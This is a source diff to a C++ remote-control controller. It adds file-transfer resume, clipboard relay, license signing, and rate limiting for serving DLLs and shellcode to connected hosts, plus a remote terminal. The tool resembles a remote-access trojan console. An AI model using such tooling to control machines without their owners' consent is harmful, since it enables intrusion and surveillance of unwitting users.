+                if (dlg && dlg->GetSafeHwnd()) {
+                    CString fileName((char*)(pkt + 1), pkt->nameLength);
+                    FileProgressInfo info(pkt);
+                    dlg->UpdateProgress(fileName, info);
+
+                    // 最后一个文件的最后一个包
+                    if (pkt->fileIndex + 1 == pkt->totalFiles &&
+                        pkt->offset + pkt->dataLength >= pkt->fileSize) {
+                        dlg->FinishFileSend(TRUE);
+                    }
+                }
+            } else {
+                Mprintf("[V2] C2C 转发失败: 目标 %llu 不在线\n", pkt->dstClientID);
+            }
+        }
+        break;
+    }
+    case COMMAND_FILE_RESUME: {
+        // V2 断点续传控制
+        // 注意：有两种格式的包共用此命令:
+        // - FileResumePacketV2 (49+ bytes): 单文件续传请求/响应
+        // - FileResumeResponseV2 (23+ bytes): 批量续传查询响应
+        // 通过包大小区分
+
+        if (len >= sizeof(FileResumePacketV2)) {
+            // 大包: 按 FileResumePacketV2 解析
+            FileResumePacketV2* pkt = (FileResumePacketV2*)szBuffer;
+
+            if (pkt->dstClientID == 0) {
+                // 目标是主控端 - 客户端请求续传到主控端
+                Mprintf("[V2] 收到断点续传请求: transferID=%llu, flags=0x%04X\n", pkt->transferID, pkt->flags);
+
+                if (pkt->flags & FFV2_RESUME_REQ) {
+                    // 客户端询问：你收到了多少？
+                    // 获取本地接收状态并发送响应
+                    TransferStateInfo info;
+                    if (GetTransferState(pkt->transferID, pkt->fileIndex, info)) {
+                        // 构建 RESUME_RESP 包
+                        size_t rangeDataSize = info.receivedRanges.size() * sizeof(FileRangeV2);
+                        size_t totalSize = sizeof(FileResumePacketV2) + rangeDataSize;
+                        std::vector<uint8_t> respBuf(totalSize);
+
+                        FileResumePacketV2* resp = (FileResumePacketV2*)respBuf.data();
+                        resp->cmd = COMMAND_FILE_RESUME;
+                        resp->transferID = pkt->transferID;
+                        resp->srcClientID = 0;  // 主控端
+                        resp->dstClientID = pkt->srcClientID;  // 回复给请求方
+                        resp->fileIndex = pkt->fileIndex;
+                        resp->fileSize = info.fileSize;
+                        resp->receivedBytes = info.receivedBytes;
+                        resp->flags = FFV2_RESUME_RESP;
+                        resp->rangeCount = (uint16_t)info.receivedRanges.size();
+
+                        // 写入区间数据
+                        FileRangeV2* ranges = (FileRangeV2*)(respBuf.data() + sizeof(FileResumePacketV2));
+                        for (size_t i = 0; i < info.receivedRanges.size(); i++) {
+                            ranges[i].offset = info.receivedRanges[i].first;
+                            ranges[i].length = info.receivedRanges[i].second;
+                        }
+
+                        ContextObject->Send2Client((LPBYTE)respBuf.data(), (int)totalSize);
+                        Mprintf("[V2] 已发送续传响应: received=%llu/%llu, ranges=%zu\n",
+                            info.receivedBytes, info.fileSize, info.receivedRanges.size());
+                    } else {
+                        // 没有找到传输状态，可能是全新传输或已完成
+                        Mprintf("[V2] 未找到传输状态: transferID=%llu\n", pkt->transferID);
+                        // 发送空响应，表示需要从头开始
+                        FileResumePacketV2 resp = {};
+                        resp.cmd = COMMAND_FILE_RESUME;
+                        resp.transferID = pkt->transferID;
+                        resp.srcClientID = 0;
+                        resp.dstClientID = pkt->srcClientID;
+                        resp.fileIndex = pkt->fileIndex;
+                        resp.fileSize = 0;
+                        resp.receivedBytes = 0;
+                        resp.flags = FFV2_RESUME_RESP;
+                        resp.rangeCount = 0;
+                        ContextObject->Send2Client((LPBYTE)&resp, sizeof(resp));
+                    }
+                }
+                else if (pkt->flags & FFV2_CANCEL) {
+                    // 取消传输
+                    CleanupResumeState(pkt->transferID);
+                    Mprintf("[V2] 传输已取消: transferID=%llu\n", pkt->transferID);
+                }
+            } else if (pkt->srcClientID == 0 && (pkt->flags & FFV2_RESUME_REQ)) {
+                // 服务端是源 - 客户端请求续传服务端发送的文件
+                Mprintf("[V2] 收到服务端->客户端续传请求: transferID=%llu, received=%llu/%llu\n",
+                    pkt->transferID, pkt->receivedBytes, pkt->fileSize);
+                HandleFileResumeRequest(ContextObject, szBuffer, len);
+            } else {
+                // 转发到目标客户端
+                context* dstCtx = FindHost(pkt->dstClientID);
+                if (dstCtx) {
+                    dstCtx->Send2Client(szBuffer, len);
+                    Mprintf("[V2] 转发续传包: transferID=%llu -> %llu\n", pkt->transferID, pkt->dstClientID);
+                } else {
+                    Mprintf("[V2] 续传目标不在线: %llu\n", pkt->dstClientID);
+                }
+            }
+        } else if (len >= sizeof(FileResumeResponseV2)) {
+            // 小包: 按 FileResumeResponseV2 解析（批量续传查询响应）
+            FileResumeResponseV2* resp = (FileResumeResponseV2*)szBuffer;
+
+            if (resp->dstClientID == 0) {
+                // 目标是服务端 - 处理客户端的续传响应
+                Mprintf("[V2] 收到客户端续传响应: %u 个文件, srcClientID=%llu\n", resp->fileCount, resp->srcClientID);
+
+                // 解析响应条目
+                std::map<uint32_t, uint64_t> offsets;
+                const uint8_t* ptr = szBuffer + sizeof(FileResumeResponseV2);
+                const uint8_t* end = szBuffer + len;
+                for (uint32_t i = 0; i < resp->fileCount && ptr + sizeof(FileResumeResponseEntryV2) <= end; i++) {
+                    const FileResumeResponseEntryV2* entry = (const FileResumeResponseEntryV2*)ptr;
+                    if (entry->receivedBytes > 0) {
+                        offsets[entry->fileIndex] = entry->receivedBytes;
+                        Mprintf("[V2] 文件 %u: 已接收 %llu 字节\n", entry->fileIndex, entry->receivedBytes);
+                    }
+                    ptr += sizeof(FileResumeResponseEntryV2);
+                }
+
+                // 设置全局续传偏移
+                SetPendingResumeOffsets(offsets);
+            } else {
+                // 转发到目标客户端
+                context* dstCtx = FindHost(resp->dstClientID);
+                if (dstCtx) {
+                    dstCtx->Send2Client(szBuffer, len);
+                    Mprintf("[V2] 转发续传响应: -> %llu, %u 个文件\n", resp->dstClientID, resp->fileCount);
+                } else {
+                    Mprintf("[V2] 续传响应目标不在线: %llu\n", resp->dstClientID);
+                }
+            }
+        } else {
+            Mprintf("[V2] 续传包大小无效: %u\n", len);
+        }
+        break;
+    }
+    case COMMAND_C2C_PREPARE_RESP: {
+        // C2C 准备响应（返回目标目录给发送方）
+        if (len < sizeof(C2CPrepareRespPacket)) break;
+        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)szBuffer;
+
+        if (resp->srcClientID == 0) {
+            // 目标是主控端 - 本地处理（M2C 传输，保存目标目录）
+            uint16_t pathLen = resp->pathLength;
+            if (len >= sizeof(C2CPrepareRespPacket) + pathLen) {
+                std::string targetDir((const char*)szBuffer + sizeof(C2CPrepareRespPacket), pathLen);
+                Mprintf("[V2] 收到目标目录响应: transferID=%llu, dir=%s\n", resp->transferID, targetDir.c_str());
+                // M2C 传输时主控端是发送方，保存目标目录用于续传查询
+                // 转换 UTF-8 为宽字符存入全局 map
+                int wlen = MultiByteToWideChar(CP_UTF8, 0, targetDir.c_str(), -1, nullptr, 0);
+                std::wstring wideDir(wlen - 1, 0);
+                MultiByteToWideChar(CP_UTF8, 0, targetDir.c_str(), -1, &wideDir[0], wlen);
+                SetSenderTargetFolder(resp->transferID, wideDir);
+            }
+        } else {
+            // C2C - 转发到源客户端
+            context* srcCtx = FindHost(resp->srcClientID);
+            if (srcCtx) {
+                srcCtx->Send2Client(szBuffer, len);
+                Mprintf("[V2] 转发目标目录响应: -> srcClient=%llu\n", resp->srcClientID);
+            } else {
+                Mprintf("[V2] 目标目录响应：源客户端不在线: %llu\n", resp->srcClientID);
+            }
+        }
+        break;
+    }
+    case COMMAND_FILE_QUERY_RESUME: {
+        // V2 续传查询（基于文件特征匹配）
+        FileQueryResumeV2* query = (FileQueryResumeV2*)szBuffer;
+
+        if (query->dstClientID == 0) {
+            // 目标是主控端 - 本地处理
+            auto response = HandleResumeQuery((const char*)szBuffer, len);
+            if (!response.empty()) {
+                ContextObject->Send2Client((LPBYTE)response.data(), (int)response.size());
+                Mprintf("[V2] 已响应续传查询: %zu 字节\n", response.size());
+            }
+        } else {
+            // C2C - 转发到目标客户端
+            context* dstCtx = FindHost(query->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+                Mprintf("[V2] 转发续传查询: -> %llu\n", query->dstClientID);
+            } else {
+                Mprintf("[V2] 续传查询目标不在线: %llu\n", query->dstClientID);
+            }
+        }
+        break;
+    }
+    case COMMAND_CLIPBOARD_V2: {
+        // V2 剪贴板请求（C2C 触发）
+        // 注意：C2C_PREPARE 已由 Ctrl+V 处理器发送，此处仅需转发
+        ClipboardRequestV2* req = (ClipboardRequestV2*)szBuffer;
+        Mprintf("[V2] C2C 剪贴板请求: src=%llu, dst=%llu, transferID=%llu\n",
+            req->srcClientID, req->dstClientID, req->transferID);
+
+        // 仅转发到源客户端（如果是从 Ctrl+V 处理器直接发送给远程桌面会话的，
+        // 这里不会执行；如果是其他路径，这里会转发）
+        context* srcCtx = FindHost(req->srcClientID);
+        if (srcCtx) {
+            srcCtx->Send2Client(szBuffer, len);
+        }
+        break;
+    }
+    case COMMAND_C2C_TEXT: {
+        // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+        if (len < 13) break;  // 最小包长度
+        uint64_t dstClientID;
+        uint32_t textLen;
+        memcpy(&dstClientID, szBuffer + 1, 8);
+        memcpy(&textLen, szBuffer + 9, 4);
+
+        Mprintf("[C2C] 文本转发: -> %llu (%u 字节)\n", dstClientID, textLen);
+
+        // 转发到目标客户端
+        context* dstCtx = FindHost(dstClientID);
+        if (dstCtx) {
+            dstCtx->Send2Client(szBuffer, len);
+        } else {
+            Mprintf("[C2C] 文本目标不在线: %llu\n", dstClientID);
+        }
+        break;
+    }
+    case COMMAND_FILE_COMPLETE_V2: {
+        // V2 文件完成校验
+        if (len < sizeof(FileCompletePacketV2)) break;
+        FileCompletePacketV2* pkt = (FileCompletePacketV2*)szBuffer;
+
+        if (pkt->dstClientID == 0) {
+            // 目标是主控端：本地校验
+            bool verifyOk = HandleFileCompleteV2((char*)szBuffer, len, 0);
+            Mprintf("[V2] 文件校验%s: transferID=%llu, fileIndex=%u\n",
+                verifyOk ? "通过" : "失败", pkt->transferID, pkt->fileIndex);
+        } else {
+            // C2C：转发到目标客户端
+            context* dstCtx = FindHost(pkt->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+                Mprintf("[V2] 转发校验包: -> %llu, transferID=%llu\n",
+                    pkt->dstClientID, pkt->transferID);
+            } else {
+                Mprintf("[V2] 校验包目标不在线: %llu\n", pkt->dstClientID);
+            }
+        }
         break;
     }
     case TOKEN_GETVERSION: { // 获取版本【L】
@@ -2634,7 +5153,8 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     case CMD_AUTHORIZATION: { // 获取授权【L】
         int n = ContextObject->InDeCompressedBuffer.GetBufferLength();
         if (n < 100) break;
-        char resp[100] = { 0 }, *devId = resp + 5, *pwdHash = resp + 32;
+        // 扩大到 400 字节以容纳 V2 签名（约 92 字节）和 Authorization（约 150 字节）
+        char resp[400] = { 0 }, *devId = resp + 5, *pwdHash = resp + 32;
         ContextObject->InDeCompressedBuffer.CopyBuffer(resp, min(n, sizeof(resp)), 0);
         unsigned short* days = (unsigned short*)(resp + 1);
         unsigned short* num = (unsigned short*)(resp + 3);
@@ -2644,13 +5164,13 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         uint32_t now = clock();
         uint32_t tm = *(uint32_t*)(resp + 96);
         if (now < tm || now - tm > 30000) {
-            Mprintf("Get authorization timeout[%s], devId: %s, pwdHash:%s", ContextObject->PeerName.c_str(),
+            Mprintf("Get authorization timeout[%s], devId: %s, pwdHash:%s", ContextObject->GetPeerName().c_str(),
                     devId, pwdHash);
             break;
         }
         uint64_t signature = *(uint64_t*)(resp + 24);
         if (devId[0] == 0 || pwdHash[0] == 0 || !VerifyMessage(m_superPass, msg, sizeof(msg), signature)) {
-            Mprintf("Get authorization failed[%s], devId: %s, pwdHash:%s\n", ContextObject->PeerName.c_str(),
+            Mprintf("Get authorization failed[%s], devId: %s, pwdHash:%s\n", ContextObject->GetPeerName().c_str(),
                     devId, pwdHash);
             break;
         }
@@ -2659,15 +5179,66 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         // 密码形式：20250209 - 20350209: SHA256: HostNum
         std::string hash = std::string(pwdHash, pwdHash+64);
         std::string password = getDateStr(0) + " - " + getDateStr(*days) + ": " + hash + ": " + hostNum;
-        std::string finalKey = deriveKey(password, std::string(devId, devId+19));
+        std::string deviceID(devId, devId+19);
+        std::string finalKey = deriveKey(password, deviceID);
         std::string fixedKey = getDateStr(0) + std::string("-") + getDateStr(*days) + "-" + hostNum +
                                std::string("-") + getFixedLengthID(finalKey);
         memcpy(devId, fixedKey.c_str(), fixedKey.length());
         devId[fixedKey.length()] = 0;
-        std::string hmac = genHMAC(hash, m_superPass);
+
+        // 检查该设备原授权是 V1 还是 V2
+        std::string origPasscode, origHmac, origRemark;
+        bool isV2 = false;
+        if (LoadLicenseInfo(deviceID, origPasscode, origHmac, origRemark)) {
+            isV2 = (origHmac.length() >= 3 && origHmac.substr(0, 3) == "v2:");
+        }
+
+        std::string hmac;
+        if (isV2) {
+            // V2 续期：使用 ECDSA 签名
+            std::string privateKeyPath = m_v2KeyPath;
+            if (!privateKeyPath.empty()) {
+                hmac = signPasswordV2(deviceID, fixedKey, privateKeyPath.c_str());
+                if (hmac.empty()) {
+                    Mprintf("V2 续期签名失败: %s\n", deviceID.c_str());
+                    // 降级到 V1
+                    uint64_t pwdHmac = SignMessage(m_superPass, (BYTE*)fixedKey.c_str(), (int)fixedKey.length());
+                    hmac = std::to_string(pwdHmac);
+                }
+            } else {
+                Mprintf("V2 私钥未配置，无法续期 V2 授权: %s\n", deviceID.c_str());
+                // 降级到 V1
+                uint64_t pwdHmac = SignMessage(m_superPass, (BYTE*)fixedKey.c_str(), (int)fixedKey.length());
+                hmac = std::to_string(pwdHmac);
+            }
+        } else {
+            // V1 续期：使用 HMAC
+            uint64_t pwdHmac = SignMessage(m_superPass, (BYTE*)fixedKey.c_str(), (int)fixedKey.length());
+            hmac = std::to_string(pwdHmac);
+        }
+
         memcpy(resp + 64, hmac.c_str(), hmac.length());
-        resp[80] = 0;
+        resp[64+hmac.length()] = 0;
+
+        // 构建 Authorization（多层授权）- 让下级主控知道向谁进行授权校验
+        // 注意：isV2Auth 判断的是当前服务端是否是授权服务器（有 V2 私钥），而非被授权设备的原授权类型
+        bool isV2Auth = !m_v2KeyPath.empty();
+        std::string authStr = BuildAuthorizationResponse(deviceID, fixedKey, hash, isV2Auth);
+        size_t authOffset = 64 + hmac.length() + 1;  // hmac 后的 null 终止符之后
+        if (!authStr.empty() && authOffset + authStr.length() + 1 < sizeof(resp)) {
+            memcpy(resp + authOffset, authStr.c_str(), authStr.length() + 1);
+            Mprintf("[CMD_AUTH] 发送授权响应: deviceID=%s, passcode=%s, auth=%zu bytes\n",
+                    deviceID.c_str(), fixedKey.c_str(), authStr.length());
+        } else {
+            Mprintf("[CMD_AUTH] 发送授权响应: deviceID=%s, passcode=%s (无 Authorization)\n",
+                    deviceID.c_str(), fixedKey.c_str());
+        }
         ContextObject->Send2Client((LPBYTE)resp, sizeof(resp));
+
+        // 注意：不在这里清除预设续期记录
+        // 因为这里的 deviceID 来自请求包（客户端硬件ID），和心跳中的 SN（授权SN）可能不同
+        // 预设续期已在 SendPendingRenewal 发送触发包后清除（使用正确的 SN）
+
         Sleep(20);
         break;
     }
@@ -2683,6 +5254,11 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
             } else if (std::string(info->Name) == FRPC_DLL_NAME) {
                 auto frpc = ReadFrpcDll(info->CallType);
                 Buffer* buf = frpc->Data;
+                // 只有 CMD_EXECUTE_DLL_NEW 才有 Parameters 字段，需要保留
+                if (cmd == CMD_EXECUTE_DLL_NEW) {
+                    DllExecuteInfoNew* p = (DllExecuteInfoNew*)(buf->Buf() + 1);
+                    memcpy(p->Parameters, ((DllExecuteInfoNew*)info)->Parameters, sizeof(p->Parameters));
+                }
                 ContextObject->Send2Client(buf->Buf(), frpc->Data->length());
                 SAFE_DELETE(frpc);
                 break;
@@ -2719,9 +5295,22 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         bool isRelease = len > 3 ? ContextObject->InDeCompressedBuffer.GetBYTE(3) : true;
         char version[12] = {};
         ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
-        BOOL send = SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
-        Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: %s\n", ContextObject->RemoteAddr().c_str(),
-                typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease, send ? "Yes" : "No");
+
+        std::string clientIP = ContextObject->GetPeerName();
+        BOOL send = FALSE;
+
+        // 检查是否被限流（只限制真实发送 DLL 的请求）
+        if (IsDllRequestLimited(clientIP)) {
+            Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: RateLimited\n",
+                    clientIP.c_str(), typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease);
+        } else {
+            send = SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
+            if (send) {
+                RecordDllRequest(clientIP);  // 只有真正发送了才记录
+            }
+            Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: %s\n",
+                    clientIP.c_str(), typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease, send ? "Yes" : "No");
+        }
         break;
     }
     case COMMAND_BYE: { // 主机下线【L】
@@ -2780,8 +5369,19 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
         break;
     }
-    case TOKEN_SHELL_START: { // 远程终端【x】
+    case TOKEN_SHELL_START: { // Windows 远程终端
         g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
+        break;
+    }
+    case TOKEN_TERMINAL_START: { // Linux PTY 终端 (WebView2 + xterm.js)
+        // 检查 WebView2 和 DLL，都满足则使用现代终端，否则退化到经典终端
+        if (IsWebView2Available() && LoadTerminalModule()) {
+            g_2015RemoteDlg->SendMessage(WM_OPENTERMINALDIALOG, 0, (LPARAM)ContextObject);
+        } else {
+            g_2015RemoteDlg->PostMessageA(WM_SHOWMESSAGE, 
+                (WPARAM)new CharMsg("To use Modern Terminal - WebView2 and TerminalModule.dll are required"), NULL);
+            g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
+        }
         break;
     }
     case TOKEN_WSLIST:  // 窗口管理【x】
@@ -2806,16 +5406,19 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         break;
     }
     case CMD_PADDING: { // 随机填充
-        Mprintf("Receive padding command '%s' [%d]: Len=%d\n", ContextObject->PeerName.c_str(), cmd, len);
+        Mprintf("Receive padding command '%s' [%d]: Len=%d\n", ContextObject->GetPeerName().c_str(), cmd, len);
         break;
     }
     default: {
-        Mprintf("Receive unknown command '%s' [%d]: Len=%d\n", ContextObject->PeerName.c_str(), cmd, len);
+        Mprintf("Receive unknown command '%s' [%d]: Len=%d\n", ContextObject->GetPeerName().c_str(), cmd, len);
+        if (cmd == TOKEN_NEXTSCREEN) {
+            ContextObject->CancelIO(); // 远程桌面可能关闭了，收到后直接断开连接，避免占用网络带宽
+        }
     }
     }
     auto duration = clock() - tick;
     if (duration > 100) {
-        Mprintf("[%s] Command '%s' [%d] cost %d ms\n", __FUNCTION__, ContextObject->PeerName.c_str(), cmd, duration);
+        Mprintf("[%s] Command '%s' [%d] cost %d ms\n", __FUNCTION__, ContextObject->GetPeerName().c_str(), cmd, duration);
     }
 }
 
@@ -2840,8 +5443,8 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
         ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);
 
         auto curID = GetMasterId();
-        ContextObject->bLogin = (LoginInfor->szMasterID == curID || strlen(LoginInfor->szMasterID)==0);
-        if (!ContextObject->bLogin) {
+        ContextObject->MasterID = LoginInfor->szMasterID[0] ? LoginInfor->szMasterID : curID;
+        if (ContextObject->MasterID != curID) {
             Mprintf("*** Received master '%s' client! ***\n", LoginInfor->szMasterID);
         }
 
@@ -2875,45 +5478,90 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 }
 
 
+// 根据列表显示索引获取 context（考虑分组过滤）
+context* CMy2015RemoteDlg::GetContextByListIndex(int iItem)
+{
+    if (iItem < 0 || iItem >= (int)m_FilteredIndices.size()) {
+        return nullptr;
+    }
+    size_t realIdx = m_FilteredIndices[iItem];
+    if (realIdx >= m_HostList.size()) {
+        return nullptr;
+    }
+    return m_HostList[realIdx];
+}
+
+// 从 m_HostList 中移除 context 并更新索引映射
+bool CMy2015RemoteDlg::RemoveFromHostList(context* ctx)
+{
+    if (!ctx) return false;
+    uint64_t clientID = ctx->GetClientID();
+    // 通知 Web 服务（批量通知，由定时器触发）
+    if (WebService().IsRunning()) {
+        WebService().MarkDeviceOffline(clientID);
+    }
+
+    // 方案1：通过索引快速查找（如果索引有效且匹配）
+    auto indexIt = m_ClientIndex.find(clientID);
+    if (indexIt != m_ClientIndex.end()) {
+        size_t idx = indexIt->second;
+        if (idx < m_HostList.size() && m_HostList[idx] == ctx) {
+            // 索引有效且指向正确的 context
+            m_HostList.erase(m_HostList.begin() + idx);
+            m_ClientIndex.erase(indexIt);
+            // 更新后续元素的索引
+            for (size_t i = idx; i < m_HostList.size(); ++i) {
+                context* c = m_HostList[i];
+                if (c) {
+                    m_ClientIndex[c->GetClientID()] = i;
+                }
+            }
+            return true;
+        }
+    }
+
+    // 方案2：索引不存在或不匹配，遍历查找（处理重复 ID 的情况）
+    for (size_t i = 0; i < m_HostList.size(); ++i) {
+        if (m_HostList[i] == ctx) {
+            m_HostList.erase(m_HostList.begin() + i);
+            // 如果索引指向的是被删除的元素，也删除索引
+            if (indexIt != m_ClientIndex.end() && indexIt->second == i) {
+                m_ClientIndex.erase(indexIt);
+            }
+            // 更新后续元素的索引
+            for (size_t j = i; j < m_HostList.size(); ++j) {
+                context* c = m_HostList[j];
+                if (c) {
+                    m_ClientIndex[c->GetClientID()] = j;
+                }
+            }
+            return true;
+        }
+    }
+    return false;
+}
+
 LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 {
-    auto host = FindHost((int)lParam);
-    if (host) {
-        CLock L(m_cs);
-        m_HostList.erase(host);
-    }
-    DialogBase* p = (DialogBase*)wParam;
-    if (p && ::IsWindow(p->GetSafeHwnd()) && p->ShouldReconnect()) {
-        ::PostMessageA(p->GetSafeHwnd(), WM_DISCONNECT, 0, 0);
+    // OfflineProc already removed context from m_HostList/m_PendingOnline and added to m_PendingOffline.
+    // The context data is passed via heap-allocated OfflineInfo struct.
+    OfflineInfo* info = (OfflineInfo*)wParam;
+    if (!info) {
         return S_OK;
     }
 
-    CString port;
-    port.FormatL("%d", lParam);
-    EnterCriticalSection(&m_cs);
-    int n = m_CList_Online.GetItemCount();
-    for (int i = 0; i < n; ++i) {
-        CString cur = m_CList_Online.GetItemText(i, ONLINELIST_ADDR);
-        if (cur == port) {
-            auto ctx = (context*)m_CList_Online.GetItemData(i);
-            m_CList_Online.DeleteItem(i);
-            m_HostList.erase(ctx);
-            break;
-        }
+    // Show offline notification
+    if (!info->ip.IsEmpty() && info->hasLogin) {
+        ShowMessage(_TR("操作成功"), info->ip + " " + _TR("主机下线") + "[" + info->aliveInfo.c_str() + "]");
+        Mprintf("%s 主机下线 [%s]\n", info->ip.GetString(), info->aliveInfo.c_str());
     }
-    if (host) {
-		CString ip = host->GetClientData(ONLINELIST_IP);
-        auto tm = host->GetAliveTime();
-        std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
-            tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
-            tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
-        ShowMessage(_TR("操作成功"), ip + " " + _TR("主机下线") + "[" + aliveInfo.c_str() + "]");
-        Mprintf("%s 主机下线 [%s]\n", ip, aliveInfo.c_str());
-    }
-    LeaveCriticalSection(&m_cs);
 
-    if (p && ::IsWindow(p->GetSafeHwnd())) {
-        ::PostMessageA(p->GetSafeHwnd(), WM_CLOSE, 0, 0);
+    // Close child dialog window
+    HWND p = info->hWnd;
+    delete info;
+
+    if (p && ::IsWindow(p)) {
+        ::PostMessageA(p, WM_CLOSE, 0, 0);
     }
 
     return S_OK;
@@ -2925,6 +5573,298 @@ LRESULT CMy2015RemoteDlg::UpdateUserEvent(WPARAM wParam, LPARAM lParam)
     UpdateActiveWindow(ctx);
 
     return S_OK;
+}
+
+// 验证 passcode 格式前缀：YYYYMMDD-YYYYMMDD
+// 例如：20260306-20270307-6666-be20-0a88-a4bc-7375
+static bool IsValidPasscodeFormat(const char* passcode)
+{
+    if (!passcode || strlen(passcode) < 17) return false;  // 至少 "YYYYMMDD-YYYYMMDD"
+
+    // 检查第一段：8位数字 (开始日期)
+    for (int i = 0; i < 8; i++) {
+        if (!isdigit((unsigned char)passcode[i])) return false;
+    }
+
+    // 检查分隔符
+    if (passcode[8] != '-') return false;
+
+    // 检查第二段：8位数字 (结束日期)
+    for (int i = 9; i < 17; i++) {
+        if (!isdigit((unsigned char)passcode[i])) return false;
+    }
+
+    return true;
+}
+
+// 构建 Authorization 响应（多层授权）
+std::string CMy2015RemoteDlg::BuildAuthorizationResponse(const std::string& sn,
+                                                          const std::string& passcode, const std::string& pwdHash, bool isV2Auth)
+{
+    std::string authStr;
+
+    if (isV2Auth) {
+        // V2 验证成功：授权服务器返回 Authorization 给第一层
+        // 从保存的 Authorization 提取下级并发数，用 passcode 中的新日期重新生成
+        std::string savedAuthObf = LoadLicenseAuthorization(sn);
+        std::string savedAuth = savedAuthObf.empty() ? "" : TcpClient::DeobfuscateAuthorization(savedAuthObf);
+
+        // 从 passcode 解析新日期: "20250101-20260101-0100-xxxx"
+        auto passcodeParts = splitString(passcode, '-');
+        if (passcodeParts.size() >= 3 && !m_v2KeyPath.empty()) {
+            std::string newStartDate = passcodeParts[0];
+            std::string newEndDate = passcodeParts[1];
+            std::string authHostNum;  // Authorization 中的下级并发数
+
+            std::string savedStartDate, savedEndDate;
+            if (!savedAuth.empty()) {
+                // 从保存的 Authorization 提取下级并发数: "startDate|endDate|hostNum|snHashPrefix|sig"
+                auto authParts = splitString(savedAuth, '|');
+                if (authParts.size() >= 3) {
+                    savedStartDate = authParts[0];
+                    savedEndDate = authParts[1];
+                    authHostNum = authParts[2];  // 保持原有的下级并发数不变
+                }
+            }
+
+            bool isNewAuth = authHostNum.empty();
+            if (isNewAuth) {
+                // 没有保存的 Authorization，使用 passcode 中的并发数作为下级并发数
+                authHostNum = passcodeParts[2];
+            }
+
+            // 检查日期是否变化
+            bool dateChanged = isNewAuth || (newStartDate != savedStartDate) || (newEndDate != savedEndDate);
+            if (!dateChanged) {
+                // 日期未变化，直接返回已保存的 Authorization
+                return savedAuthObf;
+            }
+
+            // 用新日期 + 下级并发数 重新生成 Authorization
+            std::string license = newStartDate + "|" + newEndDate + "|" + authHostNum;
+            std::string snHashPrefix = computeSnHashPrefix(sn);
+            std::string authSig = signAuthorizationV2(license, snHashPrefix, m_v2KeyPath.c_str());
+            if (!authSig.empty()) {
+                authStr = license + "|" + snHashPrefix + "|" + authSig;
+                // 保存更新后的 Authorization 到 license.ini
+                std::string authObfuscated = TcpClient::ObfuscateAuthorization(authStr);
+                UpdateLicenseAuthorization(sn, authObfuscated);
+                if (isNewAuth) {
+                    Mprintf("V2 生成新 Authorization: %s (hostNum=%s)\n", sn.c_str(), authHostNum.c_str());
+                } else {
+                    Mprintf("V2 更新 Authorization 日期: %s → %s (hostNum=%s)\n",
+                            savedEndDate.c_str(), newEndDate.c_str(), authHostNum.c_str());
+                }
+            }
+        }
+    } else {
+        // V1 验证成功：第一层返回 Authorization 给下级
+        // 注意：授权服务器（有 V2PrivateKey）不应返回 Authorization，因为它不是"第一层"
+        if (m_v2KeyPath.empty()) {
+            // 没有 V2 私钥，说明是第一层服务端，可以返回 Authorization
+            return BuildV1Authorization(sn);
+        }
+    }
+
+    // 返回混淆后的 Authorization（网络传输）
+    return authStr.empty() ? "" : TcpClient::ObfuscateAuthorization(authStr);
+}
+
+// 生成续期信息
+// 返回: (newPasscode, newHmac)，如果不需要续期则返回空字符串
+std::pair<std::string, std::string> CMy2015RemoteDlg::GenerateRenewalInfo(
+    const std::string& sn, const std::string& passcode,
+    const std::string& pwdHash, bool isV2)
+{
+    std::pair<std::string, std::string> result;
+
+    // 检查是否有预设续期
+    RenewalInfo renewal = GetPendingRenewal(sn);
+    if (!renewal.IsValid() || m_superPass.empty()) {
+        return result;
+    }
+
+    // 检查当前到期时间是否小于预设到期时间
+    std::string currentExpire = ParseExpireDateFromPasscode(passcode);
+    if (currentExpire >= renewal.ExpireDate) {
+        return result;  // 当前到期时间不小于预设到期时间，无需续期
+    }
+
+    // pwdHash 必须有效（64 字节）
+    if (pwdHash.length() != 64) {
+        Mprintf("GenerateRenewalInfo: pwdHash 长度无效 (%zu)\n", pwdHash.length());
+        return result;
+    }
+
+    // 计算从今天到过期日期的天数
+    int year = atoi(renewal.ExpireDate.substr(0, 4).c_str());
+    int month = atoi(renewal.ExpireDate.substr(4, 2).c_str());
+    int day = atoi(renewal.ExpireDate.substr(6, 2).c_str());
